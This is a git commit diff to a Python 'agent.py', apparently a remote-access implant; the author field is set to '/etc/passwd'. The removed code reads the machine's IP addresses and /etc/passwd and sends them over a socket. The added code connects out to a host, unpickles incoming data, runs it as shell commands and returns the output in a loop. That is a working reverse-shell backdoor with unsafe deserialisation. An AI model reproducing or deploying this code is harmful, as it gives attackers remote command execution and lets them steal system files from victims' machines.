1df2ad54ce75c657f0fbb182219cb1efe2e154a5
/etc/passwd <218783009+larplimiter14@users.noreply.github.com>
2026-03-13 23:16:07 +0100

    Added improvements to agent.py

--- agent.py
+++ agent.py
@@ -1,35 +1,34 @@
-import subprocess, socket
+import subprocess, socket, pickle
 
 HOST = "0.0.0.0"
-PORT = 4444
-otherPort = 445
+PORT = 445
 
-def hS():
-    r = subprocess.run("hostname -I", text=True, capture_output=True, shell=True)
+doibreak = False
+
+def yessir(idk):
+    global doibreak
+    #print(idk)
+    r = subprocess.run(idk[0], text=True, capture_output=True, shell=True)
     out = r.stdout + r.stderr
-    s = socket.socket()
-    s.connect((HOST,otherPort))
-    s.sendall(out.encode())
-    s.close()
+    if idk[1] == "__eoc__":
+        doibreak = True
+    return out
 
 
-def pR():
-    r = subprocess.run("cat /etc/passwd", text=True, capture_output=True, shell=True)
-    out = r.stdout + r.stderr
-    s = socket.socket()
-    s.connect((HOST,otherPort))
-    s.sendall(out.encode())    
-    s.close()
+
 
 
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.connect((HOST,PORT))
-    data = sock.recv(1024)
-    thing = data.decode()
-    if thing == "hS":
-        sock.close()
-        hS()
-    elif thing == "pR":
-        sock.close()
-        pR()
+    while True:
+        data = sock.recv(1024)
+        if not data:
+            break
+        thing = pickle.loads(data)
+        
+        output = yessir(thing)
+        
+        sock.sendall(output.encode())
+        if doibreak == True:
+            break
